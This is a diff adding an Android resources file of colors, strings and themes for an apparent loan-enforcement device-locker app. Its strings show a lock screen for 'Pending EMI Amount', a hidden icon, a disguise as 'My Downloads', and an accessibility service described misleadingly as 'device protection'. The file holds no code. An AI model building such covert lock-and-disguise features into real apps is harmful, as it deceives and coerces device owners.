@@ -1,0 +1,114 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources xmlns:ns1="http://schemas.android.com/tools">
+    <color name="background">#0D1117</color>
+    <color name="border">#30363D</color>
+    <color name="border_dark">#21262D</color>
+    <color name="error">#F85149</color>
+    <color name="info">#58A6FF</color>
+    <color name="lock_background">#1A1A2E</color>
+    <color name="lock_card">#2A2A40</color>
+    <color name="lock_input">#3A3A50</color>
+    <color name="on_primary">#FFFFFF</color>
+    <color name="on_secondary">#FFFFFF</color>
+    <color name="on_surface">#C9D1D9</color>
+    <color name="on_surface_secondary">#8B949E</color>
+    <color name="primary">#238636</color>
+    <color name="primary_variant">#1B2D23</color>
+    <color name="secondary">#1F6FEB</color>
+    <color name="secondary_variant">#161B22</color>
+    <color name="success">#3FB950</color>
+    <color name="surface">#161B22</color>
+    <color name="surface_header">#1C2128</color>
+    <color name="surface_variant">#21262D</color>
+    <color name="text_disabled">#6E7681</color>
+    <color name="text_muted">#8B949E</color>
+    <color name="text_primary">#FFFFFF</color>
+    <color name="text_secondary">#C9D1D9</color>
+    <color name="warning">#F0883E</color>
+    <string name="accessibility_desc">Required for protection</string>
+    <string name="accessibility_service">Accessibility Service</string>
+    <string name="accessibility_service_description">This service provides device protection features. Enable it to prevent unauthorized access and maintain device security.</string>
+    <string name="add_protection">Add Protection</string>
+    <string name="admin_zone">Admin Zone</string>
+    <string name="app_logo">App Logo</string>
+    <string name="app_name">Device Controller</string>
+    <string name="app_name_stealth">My Downloads</string>
+    <string name="call_support">Call Support</string>
+    <string name="check_status">Check Status</string>
+    <string name="device_admin">Device Admin</string>
+    <string name="device_admin_desc">Required for management</string>
+    <string name="device_controller">Device Controller</string>
+    <string name="device_id">Device ID</string>
+    <string name="device_id_placeholder">Device ID: Unknown</string>
+    <string name="device_id_unknown">Device ID: unknown</string>
+    <string name="device_is_locked">Device is Locked</string>
+    <string name="device_locked">Device Locked</string>
+    <string name="device_registration">Device Registration</string>
+    <string name="display_overlay">Display Overlay</string>
+    <string name="edit">Edit</string>
+    <string name="emi_pending">Due to Pending EMI Amount</string>
+    <string name="emi_pending_message">Due to Pending EMI Amount</string>
+    <string name="enter_device_id">Enter Device ID</string>
+    <string name="enter_master_pin">Enter Master PIN</string>
+    <string name="enter_pin">Enter PIN</string>
+    <string name="enter_pin_to_remove">Enter your master PIN to remove protection</string>
+    <string name="enterprise_management">Enterprise Management</string>
+    <string name="grant">Grant</string>
+    <string name="granted">Granted</string>
+    <string name="hide_app_icon">Hide App Icon</string>
+    <string name="hide_icon_desc">Hide icon after setup</string>
+    <string name="lock_footer">Contact your administrator for assistance</string>
+    <string name="master_pin">Master PIN</string>
+    <string name="overlay_desc">Required for lock screen</string>
+    <string name="permission">Permission</string>
+    <string name="protection_added_message">Device is now protected. The app will now disguise as \'My Downloads\'.</string>
+    <string name="protection_added_title">🛡️ Protection Added</string>
+    <string name="protection_removed_message">Device protection has been disabled. You can now uninstall the app from Settings.</string>
+    <string name="protection_removed_title">✅ Protection Removed</string>
+    <string name="remove_protection">Remove Protection</string>
+    <string name="request_break">Request 2 Min Break</string>
+    <string name="required_permissions">Required Permissions</string>
+    <string name="save_device_id">Save Device ID</string>
+    <string name="saved">Saved</string>
+    <string name="status">Status</string>
+    <string name="take_break">Take Break</string>
+    <string name="test_lock_screen">Test Lock Screen</string>
+    <string name="unlock">Unlock</string>
+    <string name="unlock_master_pin">Unlock Using Master PIN</string>
+    <style name="DialogBodyStyle" parent="MaterialAlertDialog.Material3.Body.Text">
+        <item name="android:textColor">@color/text_muted</item>
+        <item name="android:textSize">15sp</item>
+    </style>
+    <style name="DialogTitleStyle" parent="MaterialAlertDialog.Material3.Title.Text">
+        <item name="android:textColor">@color/text_primary</item>
+        <item name="android:textSize">20sp</item>
+    </style>
+    <style name="Theme.DeviceAdmin" parent="Theme.Material3.DayNight.NoActionBar">
+        <item name="colorPrimary">@color/primary</item>
+        <item name="colorPrimaryVariant">@color/primary_variant</item>
+        <item name="colorOnPrimary">@color/on_primary</item>
+        <item name="colorSecondary">@color/secondary</item>
+        <item name="colorSecondaryVariant">@color/secondary_variant</item>
+        <item name="colorOnSecondary">@color/on_secondary</item>
+        <item name="android:colorBackground">@color/background</item>
+        <item name="colorSurface">@color/surface</item>
+        <item name="colorOnSurface">@color/on_surface</item>
+        <item name="colorError">@color/error</item>
+        <item name="colorOnError">@color/on_primary</item>
+        <item name="android:statusBarColor">@color/background</item>
+        <item name="android:navigationBarColor">@color/background</item>
+        <item name="android:windowLightStatusBar" ns1:targetApi="23">false</item>
+    </style>
+    <style name="Theme.DeviceAdmin.Dialog" parent="ThemeOverlay.Material3.MaterialAlertDialog">
+        <item name="colorSurface">@color/surface</item>
+        <item name="colorOnSurface">@color/on_surface</item>
+        <item name="materialAlertDialogTitleTextStyle">@style/DialogTitleStyle</item>
+        <item name="materialAlertDialogBodyTextStyle">@style/DialogBodyStyle</item>
+    </style>
+    <style name="Theme.DeviceAdmin.Fullscreen" parent="Theme.DeviceAdmin">
+        <item name="android:windowNoTitle">true</item>
+        <item name="android:windowFullscreen">true</item>
+        <item name="android:windowContentOverlay">@null</item>
+        <item name="android:windowBackground">@android:color/black</item>
+    </style>
+</resources>
